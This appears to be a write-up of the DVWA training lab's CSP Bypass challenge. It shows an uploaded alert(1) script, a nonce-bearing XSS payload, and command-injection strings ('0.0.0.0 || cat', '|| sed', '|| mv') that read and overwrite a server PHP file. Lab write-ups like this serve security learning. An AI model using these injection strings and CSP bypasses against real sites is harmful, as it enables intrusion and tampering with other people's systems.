# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/low.php)


In the [source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/low.php) there is a comment:
```php
# https://pastebin.com/raw/R570EE00
```
If we try to include this link we see this in browser console:
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Pictures/3.png)

The file included should be a JS file (Mime type = JavaScript MIME type).

So, I created this file: 
```js
alert(1);
````
I saved as `test.js` and uploaded in the `File Upload` section.
The file was uploaded and I included here:

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Pictures/1.png)

![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Pictures/2.png)


# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/medium.php)

In the [source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/medium.php) is another interesting comment:
```php
# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```
If we try this payload it works. 

This works because the nonce token is the set correctly (like in response header) and the `X-XSS-Protection` is disabled.


# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/high.php)

We have this hint: 
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Pictures/5.png)

So, in `Command Injection` challange I inserted those command:

`0.0.0.0 || find / ` -> to see where is the file.

`0.0.0.0 || cat /var/www/html/vulnerabilities/csp/source/jsonp.php` -> to see what is there.
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Pictures/4.png)

`0.0.0.0 || sed  's/15/<anything you want>/g' /var/www/html/vulnerabilities/csp/source/jsonp.php > /var/www/html/vulnerabilities/csp/source/jsonp.php2` -> to replace the `15` with something else. For some reasons I couldn't replace in file with `sed -i`  so I used this redirect.

`0.0.0.0 || mv /var/www/html/vulnerabilities/csp/source/jsonp.php2 /var/www/html/vulnerabilities/csp/source/jsonp.php` -> to save in the correct file.



# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/impossible.php)
